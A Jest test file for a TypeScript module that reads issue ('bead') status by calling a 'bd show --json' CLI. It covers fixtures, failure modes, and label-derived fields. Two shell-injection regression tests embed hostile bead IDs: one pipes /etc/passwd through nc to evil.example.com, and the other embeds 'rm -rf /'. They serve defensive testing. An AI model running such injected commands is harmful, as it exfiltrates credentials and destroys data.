// =============================================================================
// Unit tests for src/lib/bead-status-reader.ts (beads_web-ehp.1)
// =============================================================================
//
// Covers AC items per dispatch:
//   1. Happy path: bd show --json returns fully-populated BeadSnapshot.
//   2. Failure modes — binary missing, non-zero exit, malformed JSON,
//      partial output, empty array, unknown status enum → null without throw.
//   3. Derived fields:
//      pipeline:* → pipelineStage, agent:running → hasAgentRunning,
//      qa:round-N → currentQaRound (max), wave:N → currentWave (lowest open),
//      review:needs-human → hasReviewNeedsHuman.
//   4. BeadSnapshot.status mirrors bd's enum exactly
//      (open | in_progress | blocked | closed | deferred).
//   5. Tests use a recorded fixture from a real `bd show --json` invocation.
//   6. Shell-injection regression (rzt — closes hfw AC):
//      bead IDs containing shell metacharacters pass through as a single
//      argv literal (no shell interpretation possible because execFile
//      bypasses /bin/sh).
//
// Mock pattern (rzt — replaces stale execSync mock): mock the callback-style
// `child_process.execFile` and let `promisify(execFile)` wrap it. Same shape
// as __tests__/lib/pipeline-labels.test.ts:22-31.
// =============================================================================

import * as fs from "fs";
import * as path from "path";

// Behaviour function — each test reassigns this to control execFile's
// outcome (resolve with stdout, or reject with an Error/ENOENT/timeout).
let execFileBehavior: (
  cmd: string,
  args: string[],
  opts: Record<string, unknown>,
) => { stdout: string; error?: NodeJS.ErrnoException } = () => ({
  stdout: "[]",
});

// Spy that records every call so tests can assert argv shape (load-bearing
// for the shell-injection regression test below).
const execFileCalls: Array<{
  cmd: string;
  args: string[];
  opts: Record<string, unknown>;
}> = [];

jest.mock("child_process", () => {
  const actual = jest.requireActual("child_process");
  // Callback-style execFile that promisify will wrap. Records the call
  // for argv-shape assertions, then resolves/rejects per execFileBehavior.
  const mockFn = (
    cmd: string,
    args: string[],
    opts: Record<string, unknown>,
    callback: (err: Error | null, stdout: string, stderr: string) => void,
  ) => {
    execFileCalls.push({ cmd, args, opts });
    try {
      const result = execFileBehavior(cmd, args, opts);
      if (result.error) {
        callback(result.error, "", "");
      } else {
        callback(null, result.stdout, "");
      }
    } catch (e) {
      callback(e as Error, "", "");
    }
    return undefined;
  };

  // Custom promisify symbol — when bead-status-reader does
  // `promisify(execFile)`, Node returns a function that resolves to
  // { stdout, stderr } per this implementation.
  (mockFn as unknown as Record<symbol, unknown>)[
    Symbol.for("nodejs.util.promisify.custom")
  ] = async (
    cmd: string,
    args: string[],
    opts: Record<string, unknown>,
  ) => {
    execFileCalls.push({ cmd, args, opts });
    const result = execFileBehavior(cmd, args, opts);
    if (result.error) {
      throw result.error;
    }
    return { stdout: result.stdout, stderr: "" };
  };

  return {
    ...actual,
    execFile: mockFn,
  };
});

// bd-path.getBdPath must return a deterministic path in the test environment.
jest.mock("@/lib/bd-path", () => ({
  getBdPath: () => "/usr/bin/bd",
  getBdEnv: () => ({ NO_COLOR: "1" }),
}));

import { readBeadStatus, type BeadSnapshot } from "../../src/lib/bead-status-reader";

const FIXTURE_DIR = path.join(__dirname, "..", "fixtures", "bd-show");
const OPEN_TASK_FIXTURE = fs.readFileSync(
  path.join(FIXTURE_DIR, "factory-core-a4tx.32f-open-task.json"),
  "utf-8",
);
const CLOSED_TASK_FIXTURE = fs.readFileSync(
  path.join(FIXTURE_DIR, "factory-core-9jc9-closed-task.json"),
  "utf-8",
);
const DEFERRED_FIXTURE = fs.readFileSync(
  path.join(FIXTURE_DIR, "factory-core-8260.1-deferred-bug.json"),
  "utf-8",
);

/** Build a synthetic bd-shape array around a single bead object override. */
function fakeBdShow(overrides: Partial<Record<string, unknown>>): string {
  const base = {
    id: "fake-test-bead",
    title: "fixture",
    description: "",
    status: "open",
    priority: 2,
    issue_type: "task",
    owner: "test",
    created_at: "2026-05-06T00:00:00Z",
    created_by: "test",
    updated_at: "2026-05-06T00:00:00Z",
    labels: [] as string[],
    dependencies: [],
    dependents: [],
  };
  return JSON.stringify([{ ...base, ...overrides }]);
}

/** Stub the next execFile call to resolve with the given stdout. */
function execFileResolves(stdout: string): void {
  execFileBehavior = () => ({ stdout });
}

/** Stub the next execFile call to reject with the given error. */
function execFileRejects(error: NodeJS.ErrnoException): void {
  execFileBehavior = () => ({ stdout: "", error });
}

describe("bead-status-reader (beads_web-ehp.1 + rzt)", () => {
  beforeEach(() => {
    execFileCalls.length = 0;
    execFileBehavior = () => ({ stdout: "[]" });
  });

  // ---- AC: Happy path with real fixture (open task with wave:5) ----
  test("happy path — real bd fixture parses to fully-populated BeadSnapshot", async () => {
    execFileResolves(OPEN_TASK_FIXTURE);

    const snap = await readBeadStatus("factory-core-a4tx.32f", "/fake/repo");

    expect(snap).not.toBeNull();
    expect(snap?.id).toBe("factory-core-a4tx.32f");
    expect(snap?.status).toBe("open");
    expect(snap?.type).toBe("task");
    expect(snap?.labels).toEqual(["wave:5"]);
    expect(snap?.pipelineStage).toBeNull();
    expect(snap?.currentQaRound).toBeNull();
    expect(snap?.currentWave).toBe(5);
    expect(snap?.hasAgentRunning).toBe(false);
    expect(snap?.hasReviewNeedsHuman).toBe(false);
  });

  // ---- AC: real fixture coverage — closed status ----
  test("real bd fixture — closed task parses to status='closed'", async () => {
    execFileResolves(CLOSED_TASK_FIXTURE);

    const snap = await readBeadStatus("factory-core-9jc9", "/fake/repo");

    expect(snap).not.toBeNull();
    expect(snap?.status).toBe("closed");
    expect(snap?.id).toBe("factory-core-9jc9");
    expect(snap?.type).toBe("task");
    expect(snap?.currentWave).toBeNull();
    expect(snap?.pipelineStage).toBeNull();
  });

  // ---- AC: real fixture coverage — deferred status + wave label ----
  test("real bd fixture — deferred bead parses to status='deferred' + currentWave=1", async () => {
    execFileResolves(DEFERRED_FIXTURE);

    const snap = await readBeadStatus("factory-core-8260.1", "/fake/repo");

    expect(snap).not.toBeNull();
    expect(snap?.status).toBe("deferred");
    expect(snap?.id).toBe("factory-core-8260.1");
    expect(snap?.labels).toEqual([
      "defer:focus-coherence-only",
      "epic:factory-core-8260",
      "ship-type:internal",
      "wave:1",
    ]);
    expect(snap?.currentWave).toBe(1);
  });

  // ---- AC: BeadSnapshot.status mirrors bd's full enum ----
  test.each<["open" | "in_progress" | "blocked" | "closed" | "deferred"]>([
    ["open"],
    ["in_progress"],
    ["blocked"],
    ["closed"],
    ["deferred"],
  ])("status enum — '%s' is accepted and preserved", async (status) => {
    execFileResolves(fakeBdShow({ status }));
    const snap = await readBeadStatus("fake-test-bead", "/fake/repo");
    expect(snap?.status).toBe(status);
  });

  // ---- Failure mode: binary missing / spawn failure ----
  test("failure — execFile rejects (binary missing) → returns null", async () => {
    const err = new Error("spawn bd ENOENT") as NodeJS.ErrnoException;
    err.code = "ENOENT";
    execFileRejects(err);

    const snap = await readBeadStatus("any-id", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: non-zero exit ----
  test("failure — execFile rejects on non-zero exit → returns null", async () => {
    const err = new Error("Command failed: bd show foo --json") as NodeJS.ErrnoException;
    (err as NodeJS.ErrnoException & { code?: number | string }).code = 1;
    execFileRejects(err);

    const snap = await readBeadStatus("missing-bead", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: malformed JSON ----
  test("failure — malformed JSON output → returns null", async () => {
    execFileResolves("{not valid json[");

    const snap = await readBeadStatus("any-id", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: empty stdout ----
  test("failure — empty string output → returns null (JSON.parse throws)", async () => {
    execFileResolves("");

    const snap = await readBeadStatus("any-id", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: empty array (bd returned no bead) ----
  test("failure — empty array output → returns null (no bead in payload)", async () => {
    execFileResolves("[]");

    const snap = await readBeadStatus("missing-bead", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: partial output (missing required fields) ----
  test("failure — payload missing 'status' field → returns null", async () => {
    execFileResolves(JSON.stringify([{ id: "x", labels: [], issue_type: "task" }]));

    const snap = await readBeadStatus("x", "/fake/repo");

    expect(snap).toBeNull();
  });

  test("failure — payload missing 'id' field → returns null", async () => {
    execFileResolves(JSON.stringify([{ status: "open", labels: [], issue_type: "task" }]));

    const snap = await readBeadStatus("x", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Failure mode: unknown status enum value ----
  test("failure — unknown status value → returns null (schema mismatch)", async () => {
    execFileResolves(fakeBdShow({ status: "frobnicated" }));

    const snap = await readBeadStatus("x", "/fake/repo");

    expect(snap).toBeNull();
  });

  // ---- Schema-tolerance: missing labels array → empty array, not null ----
  test("schema-tolerance — missing labels field → empty labels array", async () => {
    execFileResolves(JSON.stringify([{ id: "x", status: "open", issue_type: "task" }]));

    const snap = await readBeadStatus("x", "/fake/repo");

    expect(snap).not.toBeNull();
    expect(snap?.labels).toEqual([]);
    expect(snap?.pipelineStage).toBeNull();
    expect(snap?.currentWave).toBeNull();
    expect(snap?.currentQaRound).toBeNull();
    expect(snap?.hasAgentRunning).toBe(false);
    expect(snap?.hasReviewNeedsHuman).toBe(false);
  });

  // ---- Derived: pipelineStage from pipeline:<stage> label ----
  test("derived — pipeline:<stage> label → pipelineStage", async () => {
    execFileResolves(
      fakeBdShow({ labels: ["pipeline:development", "ship-type:internal"] }),
    );

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.pipelineStage).toBe("development");
  });

  // ---- Derived: hasAgentRunning ----
  test("derived — agent:running label → hasAgentRunning=true", async () => {
    execFileResolves(fakeBdShow({ labels: ["agent:running", "wave:2"] }));

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.hasAgentRunning).toBe(true);
  });

  // ---- Derived: hasReviewNeedsHuman ----
  test("derived — review:needs-human label → hasReviewNeedsHuman=true", async () => {
    execFileResolves(fakeBdShow({ labels: ["review:needs-human"] }));

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.hasReviewNeedsHuman).toBe(true);
  });

  // ---- Derived: currentQaRound = max across qa:round-N labels ----
  test("derived — qa:round-N labels → currentQaRound is max N", async () => {
    execFileResolves(
      fakeBdShow({
        labels: ["qa:round-2", "qa:round-5", "qa:round-3", "ship-type:internal"],
      }),
    );

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.currentQaRound).toBe(5);
  });

  // ---- Derived: currentWave = lowest N across wave:N labels ----
  test("derived — wave:N labels → currentWave is lowest N", async () => {
    execFileResolves(fakeBdShow({ labels: ["wave:7", "wave:3", "wave:5"] }));

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.currentWave).toBe(3);
  });

  // ---- Derived: all derived fields together (rich label set) ----
  test("derived — rich label set populates all derived fields together", async () => {
    execFileResolves(
      fakeBdShow({
        status: "in_progress",
        labels: [
          "pipeline:qa",
          "agent:running",
          "review:needs-human",
          "qa:round-1",
          "qa:round-4",
          "wave:6",
          "wave:2",
          "ship-type:internal",
        ],
      }),
    );

    const snap = (await readBeadStatus("x", "/fake/repo")) as BeadSnapshot;

    expect(snap.status).toBe("in_progress");
    expect(snap.pipelineStage).toBe("qa");
    expect(snap.hasAgentRunning).toBe(true);
    expect(snap.hasReviewNeedsHuman).toBe(true);
    expect(snap.currentQaRound).toBe(4);
    expect(snap.currentWave).toBe(2);
  });

  // ---- spawn shape contract: cmd, argv, cwd, env, timeout passed correctly ----
  test("spawn shape — execFile called with bd path, argv array, cwd, env, timeout", async () => {
    execFileResolves(OPEN_TASK_FIXTURE);

    await readBeadStatus("factory-core-a4tx.32f", "/fake/repo/path");

    expect(execFileCalls).toHaveLength(1);
    const call = execFileCalls[0];
    // q8w/hfw fix: argv-based execFile, NOT shell-string execSync.
    expect(call.cmd).toBe("/usr/bin/bd");
    expect(call.args).toEqual(["show", "factory-core-a4tx.32f", "--json"]);
    expect(call.opts).toMatchObject({
      cwd: "/fake/repo/path",
      encoding: "utf-8",
    });
    expect((call.opts as { timeout?: number }).timeout).toBeGreaterThan(0);
  });

  // ---- rzt: shell-injection regression test (closes hfw AC) ----
  // ---------------------------------------------------------------------------
  // hfw was filed because the OLD implementation used
  //   `execSync(\`${bd} show ${beadId} --json\`)` — shell-string interpolation.
  // A bead ID like 'foo; cat /etc/passwd' would have the shell interpret the
  // ';' as a command separator. The hfw fix replaced that with execFile +
  // argv array; this test is the regression that locks the safe shape in.
  // ---------------------------------------------------------------------------
  describe("security — shell-injection regression (rzt closes hfw AC)", () => {
    test("bead ID containing shell metacharacters passes through as a single argv literal", async () => {
      // Produce a malicious bead ID that would chain commands under shell
      // interpretation (semicolon, pipe, command substitution, backticks).
      const maliciousId = "foo; cat /etc/passwd | nc evil.example.com 1234 $(whoami) `id`";
      execFileResolves("[]"); // bd would return no result; test verifies the spawn shape, not the response.

      await readBeadStatus(maliciousId, "/fake/repo");

      expect(execFileCalls).toHaveLength(1);
      const call = execFileCalls[0];

      // execFile is invoked with an argv array: cmd is the binary path,
      // args[1] is the FULL malicious ID as a single element. Crucially:
      //   - cmd is the bd binary, not /bin/sh.
      //   - args is an array — Node spawns the binary directly, no shell.
      //   - args[1] equals the malicious ID verbatim, not a shell-evaluated
      //     prefix ('foo' before the ';').
      expect(call.cmd).toBe("/usr/bin/bd");
      expect(Array.isArray(call.args)).toBe(true);
      expect(call.args).toEqual(["show", maliciousId, "--json"]);
      // Safety contract: the malicious ID is preserved as a single literal
      // argument — no element of args contains the unescaped chained
      // commands as separate tokens.
      expect(call.args[1]).toBe(maliciousId);
      expect(call.args).not.toContain("cat /etc/passwd");
    });

    test("bead ID with newlines and null bytes passes through verbatim (no shell interpretation)", async () => {
      const maliciousId = "foo\nrm -rf / ";
      execFileResolves("[]");

      await readBeadStatus(maliciousId, "/fake/repo");

      expect(execFileCalls).toHaveLength(1);
      const call = execFileCalls[0];
      expect(call.args).toEqual(["show", maliciousId, "--json"]);
      expect(call.args[1]).toBe(maliciousId);
    });
  });
});
